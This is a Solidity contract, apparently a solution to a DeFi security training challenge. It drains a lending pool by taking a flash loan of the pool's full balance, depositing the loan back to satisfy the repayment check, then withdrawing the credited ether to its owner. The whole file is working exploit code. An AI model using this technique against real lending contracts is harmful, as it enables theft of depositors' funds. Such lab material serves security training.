// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

contract EvilReceiver is IFlashLoanEtherReceiver, Ownable {

    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function executeFlashLoan() public onlyOwner {
        uint balance = address(pool).balance;
        pool.flashLoan(balance);
    }

    function withdraw() public onlyOwner {
        pool.withdraw();

        (bool success, ) = payable(owner()).call{value: address(this).balance}("");
        require(success, "Transfer failed.");
    }

    receive () external payable {}
}